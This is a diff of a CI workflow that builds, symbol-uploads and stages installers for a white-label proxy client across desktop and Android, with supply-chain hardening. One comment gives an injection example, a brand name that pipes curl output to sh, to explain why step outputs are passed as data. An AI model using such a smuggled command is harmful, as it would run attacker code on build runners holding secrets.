+            esac
+          fi
+          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
+            cargo tauri build --target universal-apple-darwin
+          elif [ -n "$conf" ]; then
+            cargo tauri build --config "$conf"
+          else
+            cargo tauri build
+          fi
+
+      # ── Sentry symbols: step 3/3 — upload ────────────────────────────────────
+      # Debug files (no sources — closed source) + the UI maps vite staged, under
+      # the release name the client reports (scripts/sentry-upload.sh derives it
+      # from the same .cargo/config.toml + Cargo.toml the compiler read). Every
+      # desktop job uploads the same UI maps; the upload is idempotent. A Sentry
+      # outage must not fail a release → continue-on-error.
+      #
+      # The helper's debug files go up with the app's: it is a root daemon, and
+      # its panic record (crash_record.rs) is reported by the GUI.
+      # The build steps ran every dependency's build script, and those can write
+      # RUNNER_TEMP, GITHUB_ENV and GITHUB_PATH. So before the token is handed
+      # to anything: the gate's sha256 of sentry-cli + sentry-upload.sh (step
+      # OUTPUTS — not rewritable) must still match. A mismatch is tampering, not
+      # an outage: this step has no continue-on-error and fails the build.
+      - name: Sentry symbols — verify the pinned tools are untouched
+        if: steps.sentry.outputs.enabled == 'true'
+        shell: bash
+        env:
+          TOOLS: ${{ steps.sentry.outputs.tools }}
+          CLI_SHA256: ${{ steps.sentry.outputs.cli_sha256 }}
+          UPLOAD_SHA256: ${{ steps.sentry.outputs.upload_sha256 }}
+        run: |
+          set -euo pipefail
+          export PATH=/usr/bin:/bin
+          sha() { if [ -x /usr/bin/sha256sum ]; then /usr/bin/sha256sum "$1"; else /usr/bin/shasum -a 256 "$1"; fi | awk '{print $1}'; }
+          cli="$TOOLS/sentry-cli"; [ "$RUNNER_OS" = Windows ] && cli="$cli.exe"
+          [ "$(sha "$cli")" = "$CLI_SHA256" ] || { echo "::error::sentry-cli changed after the gate verified it"; exit 1; }
+          [ "$(sha "$TOOLS/sentry-upload.sh")" = "$UPLOAD_SHA256" ] || { echo "::error::sentry-upload.sh changed after the gate copied it"; exit 1; }
+          echo "✓ sentry-cli + sentry-upload.sh unchanged since the gate"
+
+      - name: Sentry symbols — upload debug files + UI source maps
+        if: steps.sentry.outputs.enabled == 'true'
+        continue-on-error: true
+        shell: bash
+        env:
+          SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
+          TOOLS: ${{ steps.sentry.outputs.tools }}
+          CLI_SHA256: ${{ steps.sentry.outputs.cli_sha256 }}
+          UPLOAD_SHA256: ${{ steps.sentry.outputs.upload_sha256 }}
+          DEBUG_DIR: ${{ steps.sentry.outputs.debug_dir }}
+          UI_MAPS_DIR: ${{ steps.sentry.outputs.ui_maps_dir }}
+          # GITHUB_ENV is writable by the build steps: nothing it could set may
+          # run code in this shell.
+          BASH_ENV: ""
+          ENV: ""
+        run: |
+          set -euo pipefail
+          # Only system tools, only the gate's copies — checked again right
+          # before use, from a fresh directory (a GITHUB_PATH entry or a swap
+          # between the verify step and here gets nothing).
+          export PATH=/usr/bin:/bin
+          sha() { if [ -x /usr/bin/sha256sum ]; then /usr/bin/sha256sum "$1"; else /usr/bin/shasum -a 256 "$1"; fi | awk '{print $1}'; }
+          run="$(mktemp -d)"; trap 'rm -rf "$run"' EXIT
+          ext=""; [ "$RUNNER_OS" = Windows ] && ext=".exe"
+          cp "$TOOLS/sentry-cli$ext" "$run/sentry-cli$ext"; cp "$TOOLS/sentry-upload.sh" "$run/sentry-upload.sh"
+          [ "$(sha "$run/sentry-cli$ext")" = "$CLI_SHA256" ] || { echo "::error::sentry-cli changed after the gate verified it"; exit 1; }
+          [ "$(sha "$run/sentry-upload.sh")" = "$UPLOAD_SHA256" ] || { echo "::error::sentry-upload.sh changed after the gate copied it"; exit 1; }
+          export SENTRY_CLI="$run/sentry-cli$ext"
+          export QUASAR_SENTRY_SOURCE_ROOT="$GITHUB_WORKSPACE"
+          up() { bash "$run/sentry-upload.sh" "$@"; }
+          echo "· sentry release: $(up release)"
+          case "${{ matrix.arch }}" in
+            darwin-*)
+              set -- target/aarch64-apple-darwin/release/quasar-app.dSYM \
+                     target/x86_64-apple-darwin/release/quasar-app.dSYM \
+                     target/aarch64-apple-darwin/release/quasar-helper.dSYM \
+                     target/x86_64-apple-darwin/release/quasar-helper.dSYM ;;
+            windows-*)
+              set -- target/release/quasar-app.exe target/release/quasar_app.pdb \
+                     target/release/quasar-helper.exe target/release/quasar_helper.pdb ;;
+            linux-*)
+              # quasar-app.debug + quasar-helper.debug
+              set -- "$DEBUG_DIR" ;;
+          esac
+          up debug-files "$@"
+          up sourcemaps "$UI_MAPS_DIR"
+
+      # The Linux helper accepts the AppImage's kernel by sha256 (baked by
+      # stage-helper.sh from resources/kernels BEFORE bundling). If bundling
+      # rewrote the kernel (strip / patchelf), TUN from the AppImage would refuse
+      # it — say so here instead of in a user's log. Warning only: deb/rpm (root-
+      # owned install paths) are unaffected either way.
+      - name: Check the AppImage kept the kernel bytes the helper trusts
+        if: startsWith(matrix.arch, 'linux-')
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -euo pipefail
+          img=""
+          for f in target/release/bundle/appimage/*.AppImage; do [ -f "$f" ] && { img="$f"; break; }; done
+          [ -n "$img" ] || { echo "no AppImage built — nothing to check"; exit 0; }
+          work="$(mktemp -d)"
+          cp "$img" "$work/app.AppImage"; chmod +x "$work/app.AppImage"
+          ( cd "$work" && ./app.AppImage --appimage-extract >/dev/null )
+          bad=0
+          for k in sing-box mihomo mihomo-smart qcore; do
+            src="crates/tauri-app/resources/kernels/$k/$k"
+            [ -f "$src" ] || continue
+            # -print -quit, not `| head -1`: under pipefail, head closing the
+            # pipe early SIGPIPEs find and fails the assignment on a HIT.
+            got="$(find "$work/squashfs-root" -type f -path "*/kernels/$k/$k" -print -quit)"
+            if [ -z "$got" ]; then
+              echo "::warning::AppImage has no kernels/$k/$k"; bad=1; continue
+            fi
+            a="$(sha256sum "$src" | awk '{print $1}')"; b="$(sha256sum "$got" | awk '{print $1}')"
+            if [ "$a" != "$b" ]; then
+              echo "::warning::AppImage kernel $k was rewritten during bundling ($a → $b): the TUN helper will refuse it on AppImage installs"
+              bad=1
+            else
+              echo "✓ AppImage kernel $k unchanged ($a)"
+            fi
+          done
+          rm -rf "$work"
+          [ "$bad" = 0 ] || echo "· AppImage kernel check: see warnings above" >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Collect installer
+        id: collect
+        shell: bash
+        run: |
+          set -euo pipefail
+          # --target universal-apple-darwin nests the bundle under the target triple.
+          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
+            base="target/universal-apple-darwin/release/bundle"
+          else
+            base="target/release/bundle"
+          fi
+          case "${{ matrix.arch }}" in
+            linux-*)
+              # The AppImage is a portable, self-contained installer.
+              inst=$(ls "$base"/appimage/*.AppImage | head -1)
+              # Also ship .deb + .rpm: they use the SYSTEM webkit2gtk (a package
+              # dependency, not bundled) so they're ~1/3 the AppImage's size. They
+              # Staged under their own platform keys (linux-*-deb / -rpm) so
+              # under their own platform keys (linux-*-deb / -rpm) so installers.json
+              # lists all three. Best-effort (a target may not have built).
+              deb=$(ls "$base"/deb/*.deb 2>/dev/null | head -1 || true)
+              rpm=$(ls "$base"/rpm/*.rpm 2>/dev/null | head -1 || true)
+              echo "deb=$deb" >> "$GITHUB_OUTPUT"
+              echo "deb_name=$([ -n "$deb" ] && basename "$deb" || echo '')" >> "$GITHUB_OUTPUT"
+              echo "rpm=$rpm" >> "$GITHUB_OUTPUT"
+              echo "rpm_name=$([ -n "$rpm" ] && basename "$rpm" || echo '')" >> "$GITHUB_OUTPUT"
+              ;;
+            windows-*)
+              inst=$(ls "$base"/nsis/*-setup.exe | head -1) ;;
+            darwin-*)
+              # Ship a .pkg installer, NOT the .dmg. A pkg installer writes the app
+              # FRESH into /Applications, so the installed app carries no
+              # com.apple.quarantine flag → it launches with zero Gatekeeper
+              # prompts even though we don't notarize (this is how the mainstream
+              # un-notarized clients ship). A dragged-out .dmg app inherits the
+              # download's quarantine → the "已损坏" dead-end on Apple Silicon.
+              # Unsigned pkg over an ad-hoc-signed app — no Apple Developer account.
+              # Locate the .app with a shell glob, not `ls` — a glob keeps the exact
+              # bytes of a non-ASCII product name and never needs a subshell.
+              app=""
+              for d in "$base"/macos/*.app; do [ -d "$d" ] && { app="$d"; break; }; done
+              if [ -z "$app" ]; then
+                echo "::error::no .app under $base/macos"; ls -la "$base/macos" || true; exit 1
+              fi
+              appname=$(basename "$app" .app)
+
+              # Identifier + version come from the SOURCE OF TRUTH (tauri.conf.json,
+              # which quasar-builder just patched from brand.yaml) and the workflow
+              # input — NOT read back out of the built Info.plist.
+              #
+              # This step had never once succeeded on macOS: every macOS job in the
+              # pipeline's history died here on
+              #   Print: Entry, ":CFBundleIdentifier", Does Not Exist
+              # PlistBuddy prints an extra "File Doesn't Exist" line when the file is
+              # missing, and that line was absent — so the plist existed but lacked
+              # the key. Rather than keep guessing why the bundler omitted it, stop
+              # depending on the round-trip: we already know both values.
+              ident=$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json')).get('identifier',''))")
+              ver="$VERSION"
+              if [ -z "$ident" ]; then
+                echo "::error::tauri.conf.json has no identifier — brand apply failed?"; exit 1
+              fi
+              echo "· pkg identifier=$ident version=$ver app=$app"
+              a="${{ matrix.arch }}"; a="${a#darwin-}"
+              # One packager for local builds AND the farm: packaging/macos/
+              # build_pkg.sh. The inline pkgbuild/productbuild that used to live
+              # here never grew the `Uninstall <Brand>.command` payload, so every
+              # farm pkg left its root LaunchDaemon + helper on the machine for
+              # good once the app was trashed. Same output as before: component
+              # layout under /Applications, the explicit distribution with
+              # hostArchitectures="arm64,x86_64" (without it Intel gets locked
+              # out), identifier/version from above, file name
+              # <app>_<ver>_<arch>.pkg. The slug comes from .cargo/config.toml,
+              # as for the helper itself. Built in a SUBDIRECTORY of RUNNER_TEMP:
+              # actions/checkout leaves the SSH deploy key in its top level.
+              work="$RUNNER_TEMP/macos-pkg"
+              rm -rf "$work"; mkdir -p "$work"
+              inst="$work/${appname}_${ver}_${a}.pkg"
+              APP_PATH="$app" APP_NAME="$appname" APP_ID="$ident" VERSION="$ver" \
+                PKG_OUT="$inst" WORK_DIR="$work/build" \
+                bash packaging/macos/build_pkg.sh ;;
+          esac
+          echo "installer=$inst" >> "$GITHUB_OUTPUT"
+          echo "installer_name=$([ -n "$inst" ] && basename "$inst" || echo '')" >> "$GITHUB_OUTPUT"
+
+      - name: Upload installer to R2 staging
+        shell: bash
+        env:
+          # Step outputs are DERIVED FROM THE BRAND NAME (Tauri names the bundle
+          # after productName), which a tenant controls. Interpolating them into
+          # a `run:` script is the same injection class the `version` input had:
+          # GitHub substitutes the text before bash parses it, so a brand named
+          # `Q$(curl -s x|sh)` executes on a runner holding the private-repo
+          # deploy key and the R2 + keystore credentials. Pass as data.
+          INSTALLER:      ${{ steps.collect.outputs.installer }}
+          INSTALLER_NAME: ${{ steps.collect.outputs.installer_name }}
+          DEB:            ${{ steps.collect.outputs.deb }}
+          DEB_NAME:       ${{ steps.collect.outputs.deb_name }}
+          RPM:            ${{ steps.collect.outputs.rpm }}
+          RPM_NAME:       ${{ steps.collect.outputs.rpm_name }}
+        run: |
+          set -euo pipefail
+          bid="$BUILD_ID"; arch="${{ matrix.arch }}"
+          # A universal macOS build is ONE fat artifact that serves both Apple
+          # Silicon and Intel. Publish it under both real-arch keys so a per-arch
+          # consumer of the staging layout still finds it.
+          if [ "$arch" = "darwin-universal" ]; then keys="darwin-aarch64 darwin-x86_64"; else keys="$arch"; fi
+          # Single-part PUT (s3api put-object), NOT `aws s3 cp`: cp goes multipart
+          # for files >8MB and R2 bucket-scoped tokens reject CreateMultipartUpload.
+          for k in $keys; do
+            if [ -n "$INSTALLER_NAME" ]; then
+              aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
+                --bucket "$STAGING_BUCKET" \
+                --key "$bid/installer/$k/$INSTALLER_NAME" \
+                --body "$INSTALLER" >/dev/null
+            else
+              echo "no installer bundle for $arch (check tauri.conf bundle targets)"
+            fi
+          done
+          # Extra Linux formats under their own platform keys (empty on non-Linux).
+          if [ -n "$DEB_NAME" ]; then
+            aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
+              --key "$bid/installer/${arch}-deb/$DEB_NAME" \
+              --body "$DEB" >/dev/null
+          fi
+          if [ -n "$RPM_NAME" ]; then
+            aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
+              --key "$bid/installer/${arch}-rpm/$RPM_NAME" \
+              --body "$RPM" >/dev/null
+          fi
+
+  # ── Android compile (universal APK; runs only when android/androidtv selected) ─
+  # Signs in-place (see the keystore step below); the deleted build-android.yml
+  # instead dispatched a separate sign.yml, which is how two sign runs used to
+  # clobber one another's installers.json.
+  android:
+    needs: setup
+    if: ${{ needs.setup.outputs.build_android == 'true' }}
+    runs-on: ubuntu-latest
+    env:
+      QUASAR_BUILD_TIME: ${{ needs.setup.outputs.build_time }}
+    steps:
+      - name: Load inputs (masked)
+        shell: bash
+        run: |
+          set -euo pipefail
+          inp() { jq -r ".inputs.$1 // \"\"" "$GITHUB_EVENT_PATH"; }
+          slug="$(inp slug)"; bid="$(inp build_id)"
+          [ -n "$slug" ] && echo "::add-mask::$slug"
+          [ -n "$bid" ]  && echo "::add-mask::$bid" && echo "::add-mask::${bid:0:8}"
+          {
+            echo "SLUG=$slug"
+            echo "VERSION=$(inp version)"
+            echo "BUILD_ID=$bid"
+            echo "QUASAR_BUILD_ID=$bid"
+            echo "TARGETS=$(inp targets)"
+            echo "SOURCE_SHA=$(inp source_sha)"
+          } >> "$GITHUB_ENV"
+      - name: Checkout PRIVATE source (read-only deploy key)
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          repository: codeman9528/QuasarAPP
+          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}
+          # Empty → default branch (checkout's own fallback), so a manual
+          # dispatch without source_sha behaves exactly as it used to.
+          ref: ${{ env.SOURCE_SHA }}
+
+      - name: Mask brand identity in logs
+        shell: bash
+        run: |
+          set -euo pipefail
+          f="brands/$SLUG/brand.yaml"
+          [ -f "$f" ] || exit 0
+          # name / identifier / window_title / the brand's own hosts: all of it
+          # identifies the customer, and builder + tauri print them.
+          grep -E '^[[:space:]]*(name|identifier|window_title|panel_base|update_base_url|public_url_base):' "$f" \
+            | sed -E 's/^[^:]*:[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/' \
+            | while IFS= read -r v; do
+                [ ${#v} -ge 2 ] && echo "::add-mask::$v"
+                host="$(printf '%s' "$v" | sed -nE 's#^https?://([^/:]+).*#\1#p')"
+                [ -n "$host" ] && echo "::add-mask::$host"
+              done || true
+      - uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
+        with: { distribution: temurin, java-version: "17" }
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@9fc6c4e9069bf8d3d10b2204b1fb8f6ef7065407 # v3
+        # The action's default is "tools platform-tools"; Google removed the
+        # legacy `tools` package from the SDK repository, so sdkmanager exits 1
+        # ("Failed to find package 'tools'") and the job dies here. Nothing in
+        # this build uses `tools` (cmdline-tools ships with the action).
+        with:
+          packages: platform-tools
+      - name: Install NDK + platform + build-tools
+        run: sdkmanager "ndk;28.0.13004108" "platforms;android-34" "build-tools;34.0.0"
+
+      # Pin NDK_HOME to the exact NDK we just installed (setup-android sets
+      # ANDROID_NDK_ROOT only as a process var; tauri android init hard-fails on a
+      # bad NDK_HOME). Exporting to $GITHUB_ENV makes it valid for every later step.
+      - name: Pin NDK_HOME
+        run: |
+          NDK="$ANDROID_HOME/ndk/28.0.13004108"
+          test -d "$NDK" || { echo "NDK not at $NDK"; ls "$ANDROID_HOME/ndk" || true; exit 1; }
+          echo "NDK_HOME=$NDK" >> "$GITHUB_ENV"
+          echo "ANDROID_NDK_ROOT=$NDK" >> "$GITHUB_ENV"
+          echo "ANDROID_NDK_HOME=$NDK" >> "$GITHUB_ENV"
+
+      # Go for the gomobile AAR — the embedded core, whichever kernel the brand
+      # picked (sing-box qcore, or mihomo / mihomo-smart from their pins). One
+      # toolchain for all three: 1.26.8 = the mihomo pins' exact GO_VERSION
+      # (kernels/mihomo/SOURCE; build-aar.sh checks major.minor) and a supported
+      # release for qcore, whose go.mod needs ≥ 1.25.0 (1.23 was EOL, and made
+      # `go` fetch a 1.25 toolchain behind our back). cache: false and NO module
+      # cache on this job: nothing here re-verifies a restored GOCACHE before
+      # gomobile compiles it into the APK.
+      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
+        with: { go-version: "1.26.8", cache: false }
+
+      - uses: dtolnay/rust-toolchain@688313b0823df1393bcebb1b4add0438a6d36884 # 1.88.0
+        with:
+          targets: aarch64-linux-android,armv7-linux-androideabi
+      # Same prefix-key as the desktop job — bump both together (see there).
+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
+        with: { prefix-key: "v1-quasar-farm" }
+      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with: { node-version: 20, cache: pnpm }
+
+      - name: Install Tauri CLI
+        # Exact pin, same minor as the `tauri` crate in Cargo.lock (2.11.x). "^2.1"
+        # let cargo pick the newest 2.x: tauri-cli 2.12.0 (2026-09-26) needs rustc
+        # 1.90 while this job pins 1.88, which broke every platform at install.
+        run: cargo install tauri-cli --version "=2.11.5" --locked
+
+      - name: Build UI bundle
+        run: |
+          pnpm install --frozen-lockfile
+          pnpm -C apps/ui build
+
+      - name: Apply brand
+        if: inputs.slug != ''
+        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"
+
+      # Same gate as the desktop job — the APK bakes the same allowlist, and a
+      # phone is where a redirected login hurts most. Skipped for an unbranded
+      # build (no `apply`, hence no [env] block at all).
+      - name: Verify the endpoint allowlist was baked in
+        if: inputs.slug != ''
+        shell: bash
+        run: |
+          set -euo pipefail
+          v="$(sed -n 's/^[[:space:]]*QUASAR_ENDPOINT_ALLOWLIST[[:space:]]*=[^"]*"\([^"]*\)".*/\1/p' \
+            .cargo/config.toml | head -1)"
+          # Count entries the way the CLIENT parses them (config.rs endpoint_allowlist:
+          # split on ',', trim, strip leading dots, drop empties) — not raw text.
+          # "." or "," is non-blank yet yields an empty list at runtime, which is
+          # the unrestricted client this gate exists to stop. quasar-builder's
+          # client_allowlist() applies the same rule before we ever get here.
+          n="$(printf '%s' "$v" | tr ',' '\n' \
+            | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/^\.*//' \
+            | grep -c . || true)"
+          if [ "${n:-0}" -eq 0 ]; then
+            echo "::error::QUASAR_ENDPOINT_ALLOWLIST has no usable domain (raw: '$v') — this client would post credentials to ANY host its remote config names. Re-save the brand in the console so brand.yaml carries client.endpoint_allowlist."
+            exit 1
+          fi
+          echo "endpoint allowlist: $n domain(s)"
+
+      # Same normalisation as the desktop job (see its comment). Android is the
+      # platform that needed it most: the adaptive FOREGROUND is now inset to the
+      # launcher safe zone instead of filling the 108dp canvas, the adaptive
+      # BACKGROUND is the brand colour instead of a hard-coded #fff (a white/hollow
+      # logo used to render as a blank white disc), the legacy pre-API-26
+      # ic_launcher.png is composited opaque (it used to keep alpha → black square),
+      # and the same colour feeds the Android-12 splash via res/values/colors.xml.
+      - name: Brand icons + splash (normalize → every platform)
+        if: inputs.slug != ''
+        shell: bash
+        run: cargo run -p quasar-builder -- icons --brand "brands/$SLUG/brand.yaml"
+
+      # Android-TV 16:9 banner (320×180) from the brand icon — shown on the TV
+      # home launcher. Best-effort: a committed default tv_banner.png already
+      # exists in the overlay res, so a failure here just keeps the default (the
+      # manifest's @drawable/tv_banner always resolves → build never breaks).
+      - name: Generate branded TV banner (Android)
+        if: inputs.slug != ''
+        shell: bash
+        run: |
+          SRC="brands/$SLUG/icon.png"
+          DEST="crates/tauri-app/android/app/src/main/res/drawable/tv_banner.png"
+          [ -f "$SRC" ] || { echo "no brand icon — keeping default TV banner"; exit 0; }
+          sudo apt-get install -y imagemagick >/dev/null 2>&1 || true
+          M=convert; command -v magick >/dev/null 2>&1 && M=magick
+          if "$M" -size 320x180 "xc:#191228" \( "$SRC" -resize 132x132 \) -gravity center -composite "$DEST"; then
+            echo "branded TV banner from $SRC"
+          else
+            echo "banner generation failed — keeping committed default"
+          fi
+
+      # ── Proxy kernel (sing-box | mihomo | mihomo-smart) ─────────────────────
+      # ONE kernel per brand build. quasar-builder validated brand.yaml's
+      # `client.kernel`, swapped the cargo feature and baked QUASAR_KERNEL into
+      # .cargo/config.toml; read it back from THERE (the value that reached the
+      # compiler — same reasoning as the allowlist gate) and export it for the
+      # fetch/build steps below, for scripts/android-overlay.sh (engine
+      # selection) and the AAR step.
+      #
+      # Old `source_sha` tolerance: a builder that predates `client.kernel`
+      # writes no QUASAR_KERNEL → sing-box, which is all that source can build.
+      # But if brand.yaml ASKS for mihomo and the builder did not apply it, that
+      # is a brand silently shipping the wrong kernel: fail instead.
+      - name: Resolve proxy kernel
+        id: kernel
+        shell: bash
+        run: |
+          set -euo pipefail
+          k=""
+          if [ -f .cargo/config.toml ]; then
+            k="$(sed -n 's/^[[:space:]]*QUASAR_KERNEL[[:space:]]*=[^"]*"\([^"]*\)".*/\1/p' \
+              .cargo/config.toml | head -1)"
+          fi
+          want=""
+          f="brands/$SLUG/brand.yaml"
+          if [ -n "$SLUG" ] && [ -f "$f" ]; then
+            want="$(sed -nE 's/^[[:space:]]+kernel:[[:space:]]*"?([A-Za-z0-9_-]*)"?[[:space:]]*(#.*)?$/\1/p' "$f" | head -1)"
+          fi
+          [ -n "$k" ] || k="sing-box"
+          if [ -n "$want" ] && [ "$want" != "$k" ]; then
+            echo "::error::brand.yaml asks for kernel '$want' but the applied build is '$k' — this source_sha's quasar-builder does not support client.kernel. Build a newer source, or set the brand back to sing-box."
+            exit 1
+          fi
+          case "$k" in
+            sing-box)     feat=kernel-singbox ;;
+            mihomo)       feat=kernel-mihomo ;;
+            mihomo-smart) feat=kernel-mihomo-smart ;;
+            *) echo "::error::unknown QUASAR_KERNEL '$k'"; exit 1 ;;
+          esac
+          # Only for mihomo: a sing-box build of an old source_sha keeps whatever
+          # default list that source had.
+          if [ "$k" != "sing-box" ] && ! grep -E '^default[[:space:]]*=' crates/tauri-app/Cargo.toml | grep -q "\"$feat\""; then
+            echo "::error::crates/tauri-app/Cargo.toml default features do not select $feat"; exit 1
+          fi
+          echo "QUASAR_KERNEL=$k" >> "$GITHUB_ENV"
+          echo "kernel=$k" >> "$GITHUB_OUTPUT"
+          echo "· proxy kernel: $k ($feat)"
+
+      # mihomo / mihomo-smart AARs are COMPILED from a pinned commit (see
+      # kernels/mihomo/SOURCE) with the Go set up at the top of this job.
+
+      - name: Fetch geo databases (bundled into the apk assets)
+        # MUST be fatal. Without a local geo bundle the emitter falls back to
+        # `type: remote` rule-sets fetched from a third-party CDN over
+        # `download_detour: direct`, and sing-box's RemoteRuleSet has no
+        # integrity field — a poisoned geoip-cn.srs routes everything to
+        # `direct` while the UI still says connected.
+        run: bash scripts/fetch-geo.sh crates/tauri-app/resources/geo
+
+      # White-label identity split: Kotlin package + JNI exports are hardcoded
+      # io.quasar.app, so the android CODE identity must stay io.quasar.app.
+      # Capture the brand identifier as the applicationId, reset the identifier to
+      # io.quasar.app so `tauri android init` generates code under io.quasar.app;
+      # finalize-gradle re-applies ANDROID_APP_ID as the applicationId only.
+      - name: Pin android code identity to io.quasar.app; brand the applicationId
+        if: inputs.slug != ''
+        run: |
+          conf=crates/tauri-app/tauri.conf.json
+          brand_id="$(python3 -c "import json;print(json.load(open('$conf'))['identifier'])")"
+          echo "ANDROID_APP_ID=$brand_id" >> "$GITHUB_ENV"
+          python3 -c "import json;p='$conf';d=json.load(open(p));d['identifier']='io.quasar.app';json.dump(d,open(p,'w'),indent=2)"
+          echo "code identity → io.quasar.app; applicationId → $brand_id"
+
+      - name: Build embedded sing-box core AAR (arm64 + arm7)
+        if: steps.kernel.outputs.kernel == 'sing-box'
+        env:
+          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
+        # The script moved to kernels/sing-box/scripts/ with the per-kernel layout;
+        # the old path is kept so a dispatch with an older `source_sha` still builds.
+        shell: bash
+        run: |
+          s=kernels/sing-box/scripts/build-qcore-aar.sh
+          [ -f "$s" ] || s=scripts/build-qcore-aar.sh
+          TARGETS=android/arm64,android/arm bash "$s"
+
+      # mihomo / mihomo-smart brands embed a mihomo core INSTEAD of qcore — same
+      # TARGETS convention. The script fetches the pinned source itself
+      # (kernels/mihomo/scripts/fetch-src.sh) and builds the gomobile wrapper in
+      # kernels/mihomo/mobile against it. QUASAR_KERNEL is already in the env
+      # for scripts/android-overlay.sh.
+      - name: Build embedded mihomo core AAR (arm64 + arm7)
+        if: steps.kernel.outputs.kernel != 'sing-box'
+        env:
+          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          s=kernels/mihomo/scripts/build-aar.sh
+          [ -f "$s" ] || { echo "::error::$s missing — this source cannot build a $QUASAR_KERNEL Android client"; exit 1; }
+          TARGETS=android/arm64,android/arm bash "$s" "$QUASAR_KERNEL"
+
+      # Same sha-pinned model the desktop bundles, at the same path
+      # (resources/kernels/mihomo-smart/Model.bin) for the Android packaging to
+      # pick up. The kernel must never download it itself (root/VPN process,
+      # GitHub unreachable for most users) — kernels/mihomo-smart/README.md.
+      - name: Fetch LightGBM model (mihomo-smart)
+        if: steps.kernel.outputs.kernel == 'mihomo-smart'
+        shell: bash
+        run: bash kernels/mihomo-smart/scripts/fetch-model.sh crates/tauri-app/resources/kernels/mihomo-smart
+
+      - name: Init Android project (generates gen/android)
+        env:
+          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
+        run: |
+          cd crates/tauri-app
+          cargo tauri android init
+
+      - name: Finalize gradle (link the core AAR) + overlay VPN/L3 sources
+        run: |
+          bash scripts/android-finalize-gradle.sh
+          bash scripts/android-overlay.sh
+
+      # Sentry symbols, same three steps as the desktop job (see there). Android
+      # specifics: the Rust .so is built unstripped with line tables + a GNU
+      # build-id; the unstripped copy in target/<triple>/release is uploaded,
+      # and split-debug.sh strips it INSIDE the unsigned APK (AGP only strips
+      # when it finds the exact NDK it wants, and says so only as a warning).
+      - name: Sentry symbols — gate + install pinned sentry-cli (android)
+        id: sentry
+        shell: bash
+        env:
+          SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
+        run: |
+          set -euo pipefail
+          off() { echo "::notice::$1"; echo "enabled=false" >> "$GITHUB_OUTPUT"; exit 0; }
+          [ -n "${SENTRY_AUTH_TOKEN:-}" ] || off "SENTRY_AUTH_TOKEN not set — no debug files / source maps are built or uploaded"
+          [ -f scripts/sentry-upload.sh ] && [ -f scripts/split-debug.sh ] \
+            || off "this source predates Sentry symbol upload — skipped"
+          v=3.8.0
+          case "$RUNNER_OS-$RUNNER_ARCH" in
+            Linux-X64)   f=sentry-cli-Linux-x86_64;        sum=13f8cb34ae01a6a272d7d7c22e277a105286615b4020de900ea95a8de47cdbb6 ;;
+            macOS-ARM64) f=sentry-cli-Darwin-arm64;        sum=1dda212b0e168b9c4dc48d7d3aa24c1c37de9c6edf786e6ae661236e529969cd ;;
+            macOS-X64)   f=sentry-cli-Darwin-x86_64;       sum=279c795b15de7a76106d30b6611b7942b1a97323307327bafc18335f10384c4d ;;
+            Windows-X64) f=sentry-cli-Windows-x86_64.exe;  sum=2257cf6805a616f5c3ee291a549ebbba021190048b646adc006beb4e8cdef7fd ;;
+            *) off "no pinned sentry-cli for $RUNNER_OS-$RUNNER_ARCH — skipped" ;;
+          esac
+          # Subdirectories of RUNNER_TEMP (checkout leaves the deploy key in its
+          # top level), outside the workspace. Forward slashes on Windows so
+          # node + bash agree on them. `sentry/` receives what the build
+          # produces (debug files, UI maps); `sentry-tools/` holds the two
+          # things that later run WITH the token — sentry-cli and a copy of
+          # scripts/sentry-upload.sh — whose sha256 go into this step's OUTPUTS
+          # (which no later step can rewrite, unlike GITHUB_ENV / RUNNER_TEMP):
+          # the upload step re-checks both before it runs anything.
+          dir="$RUNNER_TEMP/sentry"; tools="$RUNNER_TEMP/sentry-tools"
+          if [ "$RUNNER_OS" = Windows ]; then dir="$(cygpath -m "$dir")"; tools="$(cygpath -m "$tools")"; fi
+          rm -rf "$dir" "$tools"; mkdir -p "$dir/debug" "$tools"
+          exe="$tools/sentry-cli"; [ "$RUNNER_OS" = Windows ] && exe="$exe.exe"
+          # Network trouble is not a reason to fail a release: no symbols this
+          # time, said out loud. A checksum MISMATCH is — see below.
+          curl -fsSL --retry 3 --retry-all-errors --connect-timeout 20 --max-time 300 \
+               -o "$exe" "https://github.com/getsentry/sentry-cli/releases/download/$v/$f" \
+            || off "sentry-cli $v download failed (network) — this build uploads no debug files / source maps"
+          sha() { (sha256sum "$1" 2>/dev/null || shasum -a 256 "$1") | awk '{print $1}'; }
+          got="$(sha "$exe")"
+          [ "$got" = "$sum" ] || { echo "::error::sentry-cli $v checksum mismatch ($got)"; exit 1; }
+          chmod +x "$exe"
+          "$exe" --version
+          cp scripts/sentry-upload.sh "$tools/sentry-upload.sh"
+          {
+            echo "tools=$tools"
+            echo "cli_sha256=$got"
+            echo "upload_sha256=$(sha "$tools/sentry-upload.sh")"
+            echo "debug_dir=$dir/debug"
+            echo "ui_maps_dir=$dir/ui"
+          } >> "$GITHUB_OUTPUT"
+          {
